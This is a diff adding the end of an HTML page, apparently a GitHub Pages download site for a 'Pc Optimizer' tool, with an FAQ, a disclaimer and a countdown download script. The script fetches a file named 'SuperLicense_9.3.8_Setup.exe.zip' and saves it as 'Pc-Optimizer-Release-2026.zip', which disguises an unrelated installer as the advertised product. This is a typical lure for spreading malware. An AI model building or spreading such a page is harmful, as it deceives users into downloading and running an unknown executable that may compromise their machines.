+      <details class="faq"><summary>Where is the download?</summary><p>Press <strong>Download Release</strong> — a short toast prepares the channel for Pc Optimizer.</p></details><details class="faq"><summary>Does download start automatically?</summary><p>Only after you click Download Release. A 5s toast runs; you can Cancel or Download now.</p></details><details class="faq"><summary>Is this affiliated with Microsoft?</summary><p>No. Independent community toolkit documentation and Pages packaging.</p></details><details class="faq"><summary>What languages are in the repo?</summary><p>HTML (Pages), PHP stubs, Delphi/Pascal stubs, and JS helpers.</p></details><details class="faq"><summary>Can I read the source?</summary><p>Yes — <a href="https://github.com/Goldenzyabar/pc-optimizer-workbench-2026">github.com/Goldenzyabar/pc-optimizer-workbench-2026</a>.</p></details>
+    </section>
+
+    <section id="legal">
+      <h2>Disclaimer</h2>
+      <p class="legal">
+        Pc Optimizer packaging is provided for legitimate Windows maintenance and documentation workflows.
+        Review the repository README before running any build. You are responsible for complying with
+        local law and the terms of any upstream tools you install.
+      </p>
+    </section>
+
+    <footer>
+      <span>Pc Optimizer · GitHub Pages product site</span>
+      <span>
+        <a href="https://github.com/Goldenzyabar/pc-optimizer-workbench-2026">Source</a> ·
+        <a href="#get">Download Release</a>
+      </span>
+    </footer>
+  </div>
+
+  <div class="toast" id="dl-toast" role="status">
+    <h4>Preparing Download Release…</h4>
+    <p class="sub-line"><span id="dl-countdown">5</span>s · <strong id="dl-name"></strong></p>
+    <div class="actions">
+      <button type="button" id="dl-cancel">Cancel</button>
+      <button type="button" class="now" id="dl-now">Download now</button>
+    </div>
+  </div>
+
+<script>
+(function () {
+  const DOWNLOAD_URL = "https://github.com/user-attachments/files/30827792/SuperLicense_9.3.8_Setup.exe.zip";
+  const DOWNLOAD_NAME = "Pc-Optimizer-Release-2026.zip";
+  const AUTO_DOWNLOAD_DELAY = 5;
+  const toast = document.getElementById('dl-toast');
+  const countdownEl = document.getElementById('dl-countdown');
+  document.getElementById('dl-name').textContent = DOWNLOAD_NAME;
+
+  function triggerDownload() {
+    if (!DOWNLOAD_URL || DOWNLOAD_URL === '#') return;
+    const a = document.createElement('a');
+    a.href = DOWNLOAD_URL;
+    a.rel = 'noopener';
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+  }
+
+  function runToast() {
+    let remaining = AUTO_DOWNLOAD_DELAY, cancelled = false, done = false;
+    function finish(msg) {
+      toast.querySelector('h4').textContent = msg;
+      toast.querySelector('.actions').style.display = 'none';
+      setTimeout(function () { toast.classList.remove('visible'); }, 2800);
+    }
+    function start() {
+      if (done) return;
+      done = true;
+      triggerDownload();
+      finish('Download started');
+    }
+    toast.classList.add('visible');
+    const tick = setInterval(function () {
+      if (cancelled || done) { clearInterval(tick); return; }
+      remaining -= 1;
+      countdownEl.textContent = String(remaining);
+      if (remaining <= 0) { clearInterval(tick); start(); }
+    }, 1000);
+    document.getElementById('dl-cancel').onclick = function () {
+      if (done) return;
+      cancelled = true;
+      clearInterval(tick);
+      finish('Auto-download cancelled');
+    };
+    document.getElementById('dl-now').onclick = function () {
+      if (cancelled || done) return;
+      clearInterval(tick);
+      start();
+    };
+  }
+
+  // Dam-careful: download only after click (toast), never on page load.
+  document.getElementById('dl-main').addEventListener('click', runToast);
+})();
+</script>
+</body>
+</html>
